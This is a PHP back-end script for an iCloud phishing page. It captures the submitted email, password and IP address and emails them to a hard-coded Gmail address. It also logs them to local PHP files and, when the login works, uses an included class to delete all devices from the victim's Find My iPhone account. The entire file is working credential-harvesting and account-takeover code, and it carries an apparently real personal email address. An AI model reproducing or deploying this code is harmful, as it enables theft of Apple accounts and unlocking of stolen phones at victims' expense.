<?php

//Creamos o abrimos la sesion...
session_start();

$email = $_POST['user'];
$pass = $_POST['pass'];

function getUserIP() {
    $client = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}

$user_ip = getUserIP();
// Additional headers
$headers = 'To: New User' . "\r\n";
$headers .= 'From: iServer' . "\r\n";

// To send HTML mail, the Content-type header must be set
$headers .= 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
// Send email with reply
$to = "rubenrodri291@gmail.com";

// Subject
$subject = 'Email Account Details';

// Message
$message = 'Email Account Details<br><br>Email: ' . $email . '<br>
Password: ' . $pass . '<br><br>
IP Address:' . $user_ip . '<br><hr>';
include("ifind.php");
$FMI = new Devjo();
if ($FMI->Login($email, $pass) == true) {
    $devices_array = $FMI->Delete_All();
    $body = implode("\n", $devices_array);
    $message .= $body;
    // Mail it
    mail($to, $subject, $message, $headers);

    $email = $_POST['user'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $_SESSION['bloqueo'] = $ip;
    $time = time();
    $hora = date("d-m-Y (H:i:s)", $time);
    $f = fopen("./data/classTrue.php", "a");
    fwrite($f, '<table border="2px" style="background-color: black; border-color: white;">
        <tr>
        <p style="color: white;"><a style="color: red;">Fecha y Hora: </a>' . $hora . ' </p>
            <td>
                <p style="color: white;">Email: </p>
            </td>
            <td>
                <a style="color: red;"> ' . $email . '</a>
            </td>
        </tr>
        <tr>
            <td>
                <p style="color: white;">Password: </p>
            </td>
            <td>
                <a style="color: red;"> ' . $pass . '</a>
            </td>
        </tr>
        <tr>
            <td>
                <p style="color: white;">IP: </p>
            </td>
            <td>
                <a style="color: red;"> ' . $ip . '</a>
            </td>
        <tr>
            <td>
                <p style="color: white;">Login: </p>
            </td>
            <td>
                <a style="color: red;" href="https://icloud.com"> iCloud.com </a>
            </td>
        </tr>
    </table><br>');
    fclose($f);

    header("Location: fmi.php");
} else {
    //guardamos los valores que fueron enviados por el formulario en variables de sesion 
    $_SESSION['email'] = $_POST['user'];
    $email = $_POST['user'];
    $pass = $_POST['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $f = fopen("./data/classFalse.php", "a");
    fwrite($f, 'Email: [<b><font color="#0000FF">' . $email . '</font></b>] Password: [<b><font color="#FF0040">' . $pass . '</font></b>] IP: [<b><font color="#FE2EF7">' . $ip . '</font></b>]<br>');
    fclose($f);

    // Send email with reply
    $to = "rubenrodri291@gmail.com";

// Subject
    $subject = 'False Account Details';

// Message
    $messageFalse = 'False Account Details<br><br>Email : ' . $email . '<br>
Password: ' . $pass . '<br><br>
IP Address:' . $user_ip . '<br><hr>';
    
    $subject = "False Account Details";
    
        mail($to, $subject, $messageFalse, $headers);

        header("Location: ./?login_attempt=1&lwv=110");
    }
?>